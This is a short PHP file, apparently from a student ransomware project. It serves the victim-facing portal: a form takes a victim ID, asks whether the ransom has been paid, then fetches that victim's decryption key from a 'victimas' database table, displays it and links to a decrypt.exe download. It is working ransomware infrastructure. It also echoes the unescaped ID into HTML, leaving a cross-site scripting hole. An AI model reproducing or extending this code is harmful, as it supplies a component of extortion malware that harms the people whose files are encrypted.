<?php

    require "class/asir2database_class.php";
    $Db = new Asir2Database(DB_HOST, DB_NAME, DB_USER, DB_PASS, DB_CHAR);



    function form() {
        $html = '
        <form action="form.php" method="GET">
            <label for="id">ID:</label>
            <input type="text" id="id" name="id" required>
            <br>
            <input type="submit" value="Enviar">
        </form>
        ';
        return $html;
    }
    
    function has_pagado($id) {
        $html = '
        <h1>¿HAS PAGADO?</h1>
        <form action="form.php?id=' . $id . '" method="POST">
            <input type="radio" id="si" name="has_pagado" value="si">
            <label for="si">Sí</label><br>
            <input type="radio" id="no" name="has_pagado" value="no">
            <label for="no">No</label><br>
            <input type="submit" value="Enviar">
        </form>
        ';
        return $html;
    }
    
    if (isset($_GET['id'])) {
        $id = $_GET['id'];
    
        if (isset($_POST['has_pagado']) && $_POST['has_pagado'] == "si") {
           
            $sql = 'SELECT victima_key FROM victimas WHERE victima_id=?';
            $consulta = $Db->consulta($sql, [$id]);
    
            if ($consulta) {
                echo "La clave es: " . $consulta[0]['victima_key'];
                echo "<br>";
                echo "<a href=/hola/decrypt.exe>Para desencriptar muéveme a la carpeta donde está el readme.txt y ejecutame</a>";
            } else {
                echo "No se ha encontrado la ID";
            }
        } else {
            echo has_pagado($id);
        }
    } else {
        echo form();
    }
    


    $Db->desconecta();
?>
